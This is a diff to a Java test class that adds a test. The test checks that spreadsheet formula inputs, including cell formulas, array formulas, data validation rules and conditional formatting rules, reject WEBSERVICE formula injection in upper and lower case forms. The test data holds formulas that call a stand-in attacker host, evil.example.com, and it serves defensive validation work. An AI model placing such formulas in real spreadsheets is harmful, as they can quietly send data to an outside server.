@@ -96,6 +96,35 @@ class ProtocolResidualCoverageTest {
   }
 
   @Test
+  void rejectsWebserviceFormulaInjectionInAllCaseForms() { // LIM-031
+    assertThrows(
+        IllegalArgumentException.class,
+        () ->
+            new CellInput.Formula(
+                TextSourceInput.inline("WEBSERVICE(\"https://evil.example.com\")")));
+    assertThrows(
+        IllegalArgumentException.class,
+        () ->
+            new CellInput.Formula(
+                TextSourceInput.inline("=webservice(\"https://evil.example.com\")")));
+    assertThrows(
+        IllegalArgumentException.class,
+        () ->
+            new ArrayFormulaInput(
+                TextSourceInput.inline("{=WEBSERVICE(\"https://evil.example.com\")}")));
+    assertThrows(
+        IllegalArgumentException.class,
+        () ->
+            new DataValidationRuleInput.CustomFormula(
+                "WEBSERVICE(\"https://evil.example.com\")"));
+    assertThrows(
+        IllegalArgumentException.class,
+        () ->
+            new ConditionalFormattingRuleInput.FormulaRule(
+                "WEBSERVICE(\"https://evil.example.com\")", false, Optional.empty()));
+  }
+
+  @Test
   void simpleShapeKindRemainsExplicit() {
     DrawingAnchorInput.TwoCell anchor =
         new DrawingAnchorInput.TwoCell(
